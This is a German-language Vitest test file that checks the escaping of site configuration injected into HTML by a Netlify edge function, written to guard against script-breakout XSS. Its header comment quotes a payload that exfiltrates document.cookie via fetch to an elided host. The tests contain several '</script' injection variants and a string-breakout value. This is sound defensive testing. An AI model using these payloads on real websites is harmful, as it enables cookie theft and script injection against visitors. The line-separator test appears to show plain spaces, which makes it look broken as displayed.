// @vitest-environment node
/**
 * Die Konfiguration, die die Netlify-Edge-Function ins HTML schreibt
 * (netlify/edge-functions/inject-site-config.ts).
 *
 * ANLASS: Dort stand `JSON.stringify(config).replace(/<\/script>/gi, …)`. Das
 * greift zu kurz — der HTML-Parser beendet einen Script-Block auch bei
 * `</script ` und `</script/`. Ein Betriebsname wie
 *
 *   Adler</script ><script>fetch("https://…?c="+document.cookie)</script>
 *
 * hätte damit bei JEDEM Besucher der Subdomain fremdes JavaScript ausgeführt.
 * Der Name kommt aus dem HTML der analysierten Website (og:site_name), also
 * aus einer Quelle, die dem Betrieb nicht gehören muss.
 *
 * Die Escape-Funktion wird hier NICHT nachgebaut, sondern aus der echten Datei
 * gelesen und ausgeführt — ein Nachbau prüfte nur meine Annahme darüber.
 */
import { describe, expect, it } from "vitest";
import { readFileSync } from "node:fs";
import path from "node:path";

/** Die echte `fuerScriptBlock` aus der Edge-Function, ohne Deno-Importe. */
function ladeEscapeFunktion(): (wert: unknown) => string {
  const quelle = readFileSync(
    path.resolve(__dirname, "../../netlify/edge-functions/inject-site-config.ts"),
    "utf8",
  );
  const start = quelle.indexOf("function fuerScriptBlock");
  expect(start, "fuerScriptBlock nicht gefunden").toBeGreaterThan(-1);
  const ende = quelle.indexOf("\n}", start) + 2;
  // TypeScript-Annotationen entfernen - der Rumpf ist reines JavaScript.
  const code = quelle
    .slice(start, ende)
    .replace("function fuerScriptBlock(wert: unknown): string", "function fuerScriptBlock(wert)");
  // eslint-disable-next-line no-new-func
  return new Function(`${code}; return fuerScriptBlock;`)() as (w: unknown) => string;
}

const fuerScriptBlock = ladeEscapeFunktion();

/** Wie der Browser den Block beendet sieht: `</script` plus Trenner. */
const SCRIPT_ENDE = /<\/script[\s/>]/i;

describe("Escaping der injizierten Konfiguration", () => {
  it("lässt keine Schreibweise von </script durch", () => {
    for (const nutzlast of [
      "Adler</script><script>alert(1)</script>",
      "Adler</script ><script>alert(1)</script>",
      "Adler</script/><script>alert(1)</script>",
      "Adler</SCRIPT\t><script>alert(1)</script>",
    ]) {
      const ausgabe = fuerScriptBlock({ business: { name: nutzlast } });
      expect(ausgabe, nutzlast).not.toMatch(SCRIPT_ENDE);
      expect(ausgabe, nutzlast).not.toContain("<");
    }
  });

  it("escaped auch die Subdomain, die roh in einem JS-String stand", () => {
    const ausgabe = fuerScriptBlock('x";alert(1);//');
    expect(ausgabe).toBe('"x\\";alert(1);//"');
    // Und das Ergebnis ist ein einzelnes, gültiges Literal.
    expect(JSON.parse(ausgabe)).toBe('x";alert(1);//');
  });

  it("escaped die Zeilentrenner, die JavaScript aufbrechen würden", () => {
    const ausgabe = fuerScriptBlock({ t: "a b c" });
    expect(ausgabe).not.toContain(" ");
    expect(ausgabe).not.toContain(" ");
  });

  it("bleibt gültiges JSON mit unverändertem Inhalt", () => {
    const config = {
      business: { name: "Haus Töller & Söhne <GmbH>", type: "bar" },
      content: { menuItems: [{ name: "Halver Hahn", price: "4.90" }] },
    };
    const ausgabe = fuerScriptBlock(config);
    // Der Browser liest die Escapes zurück - der Inhalt kommt unverfälscht an.
    expect(JSON.parse(ausgabe)).toEqual(config);
  });
});
